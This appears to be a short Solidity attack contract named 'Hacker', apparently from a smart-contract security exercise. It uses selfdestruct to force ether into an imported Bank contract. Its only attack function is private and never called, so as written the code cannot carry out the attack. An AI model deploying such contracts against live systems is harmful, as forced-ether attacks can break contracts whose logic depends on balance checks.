// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
 
import './Bank.sol';

contract Hacker {

    address payable _bankAddress;

    constructor(address payable _addr) payable {
        _bankAddress = _addr;
    }

    function wreckBank() private {
        selfdestruct(_bankAddress);
    }
}